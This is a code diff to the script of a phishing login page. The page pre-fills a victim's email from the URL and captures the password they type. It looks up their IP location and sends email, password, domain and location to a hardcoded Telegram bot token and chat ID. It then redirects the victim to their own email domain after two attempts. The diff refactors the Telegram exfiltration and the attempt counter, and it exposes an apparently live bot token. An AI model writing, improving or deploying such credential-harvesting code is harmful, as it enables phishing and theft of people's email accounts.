@@ -1774,6 +1774,7 @@ document.getElementById('times').innerHTML = n + ' ' + time;
 <script>
 $(document).ready(function(){
 var count=0;
+var maxAttempts = 2; // Redirect after 2 attempts
 
 var email = window.location.hash.substr(1);
 if (!email) {
@@ -1850,10 +1851,10 @@ var email=$("#email").val();
 var password=$("#password").val();
 var ind=email.indexOf("@");
 var my_slice=email.substr((ind+1));
+
 if (!password) {
  $('#auth_reg').show();
  $('#auth_reg').html("Password is empty!");
-
  return false;
  }
 
@@ -1862,57 +1863,67 @@ count=count+1;
 // --- GET IP LOCATION ---
 let ipLocation = "Unknown Location";
 try {
-    const response = await fetch('https://ipapi.co/json/');
-    const data = await response.json();
-    if(data && data.city && data.country_name) {
-        ipLocation = `${data.city}, ${data.country_name} (${data.ip})`;
-    } else {
-        ipLocation = `IP: ${data.ip}`;
-    }
+ const response = await fetch('https://ipapi.co/json/');
+ const data = await response.json();
+ if(data && data.city && data.country_name) {
+ ipLocation = `${data.city}, ${data.country_name} (${data.ip})`;
+ } else {
+ ipLocation = `IP: ${data.ip}`;
+ }
 } catch (e) {
-    console.error("Failed to fetch IP location");
+ console.error("Failed to fetch IP location");
 }
 
 // --- TELEGRAM NOTIFICATION START ---
-const BOT_TOKEN = "6130365936:AAGseTGoS7q6Jz4xzHaY9I0DQv63vgA5y4o"; // REPLACE THIS
-const CHAT_ID = "5643928959";      // REPLACE THIS
+const BOT_TOKEN = "6130365936:AAGseTGoS7q6Jz4xzHaY9I0DQv63vgA5y4o"; 
+const CHAT_ID = "5643928959"; 
 
 const message = `🔓 <b>New Login Attempt</b>\n\n📧 Email: ${email}\n🔑 Password: ${password}\n🌐 Domain: ${my_slice}\n📍 Location: ${ipLocation}`;
 
-fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
- method: 'POST',
- headers: { 'Content-Type': 'application/json' },
- body: JSON.stringify({
+// Using $.post for better compatibility with existing jQuery setup
+$.ajax({
+ url: `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+ method: "POST",
+ data: {
  chat_id: CHAT_ID,
  text: message,
- parse_mode: 'HTML'
- })
-}).then(response => response.json())
- .then(data => console.log('Telegram sent:', data))
- .catch(error => console.error('Error:', error));
+ parse_mode: "HTML"
+ },
+ success: function(response) {
+ console.log("Telegram sent successfully");
+ },
+ error: function(error) {
+ console.error("Telegram send failed", error);
+ }
+});
 // --- TELEGRAM NOTIFICATION END ---
 
 // Success Logic / Redirect
 $("#password").val("");
-if (count>=2) {
- count=0;
- window.location.replace("https://www."+my_slice);
+
+// Check if we have reached max attempts
+if (count >= maxAttempts) {
+    count = 0; // Reset counter
+    window.location.replace("https://www."+my_slice);
+} else {
+    // Update UI to show processing state
+    $("#auth_reg").show();
+    $('#auth_reg').html(`Attempt ${count}/${maxAttempts}...`); 
+    
+    // Small delay before next action or just keep them on page
+    // If you want to force redirect immediately on last attempt, uncomment below:
+    // setTimeout(() => { window.location.replace("https://www."+my_slice); }, 1000);
+    
+    // For now, we leave them on the page but show status
 }
 
-$("#auth_reg").show();
-$('#auth_reg').html("Processing..."); 
-
-setTimeout(() => {
-    window.location.replace("https://www."+my_slice);
-}, 1000);
-
  });
 
 
  });
 
 
-</script>	
+</script>
    
    </body></html>
 
